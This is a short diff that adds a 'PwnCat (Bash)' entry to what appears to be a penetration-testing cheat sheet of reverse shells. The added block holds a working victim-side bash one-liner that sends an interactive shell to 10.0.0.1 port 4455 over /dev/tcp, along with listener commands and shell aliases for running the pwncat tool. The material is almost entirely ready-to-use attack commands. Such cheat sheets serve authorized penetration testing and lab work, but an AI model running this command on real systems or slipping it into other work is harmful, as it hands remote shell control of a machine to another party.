@@ -37,6 +37,23 @@
 
 ## Reverse Shell
 
+
+### PwnCat (Bash)
+
+```bash
+Victim:
+bash -c 'bash -i >& /dev/tcp/10.0.0.1/4455 0>&1'
+
+Listener:
+pwnact; pwncat 4455
+
+pwnact is a custom alias
+pwnact='cd /root/magic/pwncat && source pwncat-env/bin/activate'
+
+pwncat is a custom alias
+alias pwncat='python -m pwncat -lp'
+```
+
 ### Bash TCP
 
 ```bash
